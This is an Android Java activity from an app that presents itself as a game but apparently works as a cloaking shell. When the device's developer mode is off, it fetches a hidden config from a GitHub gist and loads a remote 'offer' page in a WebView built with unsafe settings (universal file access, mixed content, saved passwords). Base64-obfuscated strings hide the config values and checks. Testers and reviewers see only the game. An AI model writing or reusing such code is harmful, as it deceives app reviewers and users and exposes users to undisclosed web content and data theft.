package com.gtrae.wfol;


import static com.gtrae.wfol.Parser.decode;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.onesignal.OneSignal;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;


public class GW extends AppCompatActivity {
    public static Context MAcontext;
    public static String strDeep;
    public static final String GistLink = "https://gist.githubusercontent.com/KRKRKRS/3977bc193036e4ee8ed08cfa1acb3c8d/raw/Great%2520Wolf%2520%257C%2520com.gtrae.wfol/";
    public static final String AFKey = "Q0NpRmhESjVaYnlMYm5Ybk1zcGN3Vg==";
    public static final String OneSignalId = "OGFmZGMyZDItMjE3NC00N2MyLWE0ZWYtNTZiMGUzMDY2NThh";
    private boolean binded;
    private MyService myService;
    private ProgressBar progressBar;
    private WebView webView;
    private String link;
    private ValueCallback<Uri[]> myFilePathCallback;
    private SharedPreferences sPrefs;
    private String offer;
    private String fb_Id;
    public static final String URL_SHARED_PREF = "TEFTVF9XZWJWaWV3X1VSTA==";
    public static final int INPUT_FILE_REQUEST_CODE = 1;
    public static String keyDefault;
    public static String statusAppsFlyer;
    public static String strAppsFlyer;
    public static String AppsFl_Id;
    public static String AD_ID;


    ServiceConnection myServiceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
            MyService.LocalBinder binder = (MyService.LocalBinder) iBinder;
            myService = binder.getService();
            binded = true;
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {
            binded = false;
        }
    };


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        MAcontext = this;
        getWindow().addFlags(1024);
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId(decode(GW.OneSignalId));

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        progressBar = findViewById(R.id.progressBar);

        if (devModeOff()) {

            Intent intent = new Intent(this, MyService.class);
            this.bindService(intent, myServiceConnection, Context.BIND_AUTO_CREATE);
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (binded)
                        myService.getStatusAppsFlyerAndAppsId();
                }
            }, 1000);

            webView = findViewById(R.id.webView);
            setWebView(webView);
            OkHttpClient client = new OkHttpClient();
            Request request = new Request.Builder().get().url(GW.GistLink).build();
            Call call = client.newCall(request);

            call.enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.i("MyApp", "OkHttp fail");
                    goToGame();
                }

                @Override
                public void onResponse(Call call, final Response response) throws IOException {
                    String url = response.body().string();
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            String[] params = url.split("\\|");
                            offer = params[0];
                            keyDefault = params[1];
                            fb_Id = params[2];

                            doFacebook(fb_Id, GW.this);

                            sPrefs = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
                            link = sPrefs.getString(URL_SHARED_PREF, null);

//                            if (link != null) {
//                                webView.loadUrl(link);
//                            } else {
                            // TODO handler
                            new Handler().postDelayed(new Runnable() {
                                @Override
                                public void run() {
                                    GW.this.unbindService(myServiceConnection);
                                    startWebView(offer);
                                }
                            }, 5000);
//                            }
                        }
                    });
                }
            });
        } else {
            goToGame();
        }
    }

    private void goToGame() {
        startActivity(new Intent(this, MenuActivity.class));
        finish();
    }

    void startWebView(String link) {
        if (statusAppsFlyer != null && statusAppsFlyer.equals(decode("Tm9uLW9yZ2FuaWM="))) {
            String url = link + strAppsFlyer;
            Log.i("MyApp", "non-organic - " + url);
            webView.loadUrl(url);
        } else if (strDeep != null) {
            String url = link + strDeep;
            webView.loadUrl(url);
            Log.i("MyApp", "deepLink - " + url);
        } else {
            if (keyDefault.equals("NO")) {
                goToGame();
            } else {
                String url = new Parser().parseOrganic(link);
                Log.i("MyApp", "organic - " + url);
                webView.loadUrl(url);
            }
        }
    }

    @Override
    public void onBackPressed() {
        webView.goBack();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (requestCode != INPUT_FILE_REQUEST_CODE || myFilePathCallback == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        if (resultCode == Activity.RESULT_OK & data != null) {
            String dataString = data.getDataString();
            Uri[] result = new Uri[]{Uri.parse(dataString)};
            myFilePathCallback.onReceiveValue(result);
            myFilePathCallback = null;
        }
    }


    private boolean devModeOff() {
        int devInt = android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
        return devInt == 0;
    }


    class MyWebChromeClient extends WebChromeClient {
        @Override
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
            myFilePathCallback = filePathCallback;
            startActivityForResult(new Intent(Intent.ACTION_CHOOSER).putExtra(Intent.EXTRA_INTENT, new Intent(Intent.ACTION_GET_CONTENT).addCategory(Intent.CATEGORY_OPENABLE).setType(decode("aW1hZ2UvKg=="))), INPUT_FILE_REQUEST_CODE);
            return true;
        }
    }

    class MyWebViewClient extends WebViewClient {
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            webView.setVisibility(View.VISIBLE);
            progressBar.setVisibility(ProgressBar.INVISIBLE);

            if (url.contains(decode("NDA0"))) {
                goToGame();
                finish();
            }
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            SharedPreferences.Editor editor = sPrefs.edit();
            editor.putString(URL_SHARED_PREF, url);
            editor.apply();
        }
    }


    private void doFacebook(String fbId, GW mainActivity) {
        FacebookSdk.setApplicationId(fbId);
        FacebookSdk.setAdvertiserIDCollectionEnabled(true);
        FacebookSdk.sdkInitialize(mainActivity.getApplicationContext());
        FacebookSdk.fullyInitialize();
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.setAutoLogAppEventsEnabled(true);
        AppEventsLogger.activateApp(mainActivity.getApplication());

        AppLinkData.fetchDeferredAppLinkData(mainActivity.getApplication(), appLinkData -> {
                    String deepLink = appLinkData.getTargetUri().getQuery();
                    Parser parserStr = new Parser();
                    strDeep = parserStr.parse(deepLink);
                    Log.i("MyApp", "deep in FB- " + strDeep);
                }
        );
    }

    private void setWebView(WebView webViewetgpy) {
        webViewetgpy.getSettings().setJavaScriptEnabled(true);
        webViewetgpy.getSettings().setAppCacheEnabled(true);
        webViewetgpy.getSettings().setDomStorageEnabled(true);
        webViewetgpy.getSettings().setAllowContentAccess(true);
        webViewetgpy.getSettings().setAllowFileAccess(true);
        webViewetgpy.getSettings().setAppCacheEnabled(true);
        webViewetgpy.getSettings().setAllowFileAccessFromFileURLs(true);
        webViewetgpy.getSettings().setSaveFormData(true);
        webViewetgpy.getSettings().setMixedContentMode(0);
        webViewetgpy.getSettings().setSavePassword(true);
        webViewetgpy.getSettings().setAllowContentAccess(true);
        webViewetgpy.getSettings().setLoadsImagesAutomatically(true);
        webViewetgpy.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webViewetgpy.getSettings().setDatabaseEnabled(true);
        webViewetgpy.getSettings().setLoadWithOverviewMode(true);
        webViewetgpy.getSettings().setUseWideViewPort(true);
        webViewetgpy.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webViewetgpy.getSettings().setDomStorageEnabled(true);
        webViewetgpy.getSettings().setAllowFileAccess(true);
        webViewetgpy.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
        webViewetgpy.getSettings().setEnableSmoothTransition(true);
        webViewetgpy.setWebChromeClient(new MyWebChromeClient());
        webViewetgpy.setWebViewClient(new MyWebViewClient());
    }
}